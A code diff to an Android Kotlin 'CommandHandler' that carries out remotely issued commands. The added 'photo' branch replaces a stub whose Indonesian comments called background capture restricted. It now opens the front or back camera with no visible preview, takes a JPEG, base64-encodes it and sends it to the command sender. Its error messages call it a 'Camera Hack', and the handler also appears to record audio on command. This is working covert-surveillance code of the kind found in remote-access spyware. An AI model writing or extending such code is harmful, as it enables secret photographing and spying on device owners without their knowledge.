@@ -29,6 +29,13 @@ import android.net.wifi.WifiManager
 import android.content.pm.PackageManager
 import androidx.core.content.ContextCompat
 import android.Manifest
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CaptureRequest
+import android.media.ImageReader
+import android.graphics.ImageFormat
+import android.os.HandlerThread
 
 class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {
 
@@ -334,9 +341,102 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     } else sendResponse(createResponse(cmdId, "error", "Izin RECORD_AUDIO belum di-ALLOW"))
                 }
                 "photo" -> {
-                    // Teknik jepret di belakang layar tanpa menampakkan antarmuka kamera (SurfaceView) 
-                    // adalah aktivitas yang sangat dibatasi di Android 11+. 
-                    sendResponse(createResponse(cmdId, "error", "Pemotretan tersembunyi (Background Photo Capture) memerlukan injeksi overlay UI khusus untuk menembus proteksi Kamera Android Modern."))
+                    if (checkPerm(Manifest.permission.CAMERA)) {
+                        val isFront = textArg.lowercase() == "front"
+                        Thread {
+                            try {
+                                val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                                var targetCameraId: String? = null
+                                
+                                for (camId in camManager.cameraIdList) {
+                                    val chars = camManager.getCameraCharacteristics(camId)
+                                    val facing = chars.get(CameraCharacteristics.LENS_FACING)
+                                    if (isFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
+                                        targetCameraId = camId; break
+                                    } else if (!isFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
+                                        targetCameraId = camId; break
+                                    }
+                                }
+                                
+                                if (targetCameraId == null) targetCameraId = camManager.cameraIdList.firstOrNull()
+                                
+                                if (targetCameraId != null) {
+                                    val handlerThread = HandlerThread("CameraBackground").apply { start() }
+                                    val handler = Handler(handlerThread.looper)
+                                    
+                                    val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
+                                    var isCaptured = false
+                                    var activeCamera: CameraDevice? = null
+                                    var activeSession: CameraCaptureSession? = null
+                                    
+                                    imageReader.setOnImageAvailableListener({ reader ->
+                                        if (!isCaptured) {
+                                            isCaptured = true
+                                            try {
+                                                val image = reader.acquireLatestImage()
+                                                val buffer = image.planes[0].buffer
+                                                val bytes = ByteArray(buffer.remaining())
+                                                buffer.get(bytes)
+                                                image.close()
+                                                
+                                                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                                                sendResponse(createResponse(cmdId, "photo_base64", b64))
+                                            } catch (e: Exception) {
+                                                sendResponse(createResponse(cmdId, "error", "Gagal memproses gambar: ${e.message}"))
+                                            } finally {
+                                                reader.close()
+                                                activeSession?.close()
+                                                activeCamera?.close()
+                                                handlerThread.quitSafely()
+                                            }
+                                        }
+                                    }, handler)
+                                    
+                                    // Buka kamera
+                                    camManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
+                                        override fun onOpened(camera: CameraDevice) {
+                                            activeCamera = camera
+                                            try {
+                                                val surfaces = listOf(imageReader.surface)
+                                                camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
+                                                    override fun onConfigured(session: CameraCaptureSession) {
+                                                        activeSession = session
+                                                        try {
+                                                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                                                            captureBuilder.addTarget(imageReader.surface)
+                                                            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                                            session.capture(captureBuilder.build(), null, handler)
+                                                        } catch (e: Exception) {
+                                                            sendResponse(createResponse(cmdId, "error", "Gagal di stage Capture: ${e.message}"))
+                                                            session.close()
+                                                            camera.close()
+                                                        }
+                                                    }
+                                                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                                                        sendResponse(createResponse(cmdId, "error", "Capture Session Failed"))
+                                                        session.close()
+                                                        camera.close()
+                                                    }
+                                                }, handler)
+                                            } catch (e: Exception) {
+                                                sendResponse(createResponse(cmdId, "error", "Session Error: ${e.message}"))
+                                                camera.close()
+                                            }
+                                        }
+                                        override fun onDisconnected(camera: CameraDevice) { camera.close() }
+                                        override fun onError(camera: CameraDevice, error: Int) {
+                                            sendResponse(createResponse(cmdId, "error", "Camera Device Error code: $error"))
+                                            camera.close()
+                                        }
+                                    }, handler)
+                                } else {
+                                    sendResponse(createResponse(cmdId, "error", "Kamera target tidak ditemukan!"))
+                                }
+                            } catch (e: Exception) {
+                                sendResponse(createResponse(cmdId, "error", "Termux-Camera Hack Gagal: ${e.message}"))
+                            }
+                        }.start()
+                    } else sendResponse(createResponse(cmdId, "error", "Izin CAMERA belum di-ALLOW OS Android!"))
                 }
                 else -> {
                     sendResponse(createResponse(cmdId, "error", "Unknown command: $command"))
